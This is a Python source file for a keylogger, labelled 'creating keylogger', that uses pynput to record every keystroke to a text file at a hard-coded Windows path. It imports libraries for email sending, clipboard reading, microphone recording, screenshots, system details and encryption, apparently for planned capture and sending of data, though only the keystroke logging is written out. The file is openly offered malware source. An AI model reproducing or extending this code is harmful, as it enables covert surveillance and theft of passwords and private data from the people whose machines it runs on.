# logging keys
from pynput.keyboard import Key, Listener

# Email
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

# computer info
import socket
import platform

# clipboard
import win32clipboard

# microphone
from scipy.io.wavfile import write
import sounddevice as sd

# screenshot
from multiprocessing import Process, freeze_support
from PIL import ImageGrab

# cryptography
from cryptography.fernet import Fernet

# other libraries
import time
import os

import getpass
from requests import get

# creating keylogger
key_info = "key_log.txt"

file_path = "C:\\me\\python"
extend = "\\"

count = 0
keys = []

def on_press(key):
    global keys, count 

    keys.append(key)
    count += 1

    if count >= 1:
        count = 0
        write_file(keys)
        keys = []


def write_file(keys):
    with open(file_path + extend + key_info, "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write("\n")
                f.close()

            elif k.find("key") == -1:
                f.write(k)
                f.close()

def on_release(key):
    try:
        if key == Key.esc:
            return False
    
    except AttributeError:
        pass
    
with Listener(on_press= on_press, on_release= on_release) as listner:
    listner.join()

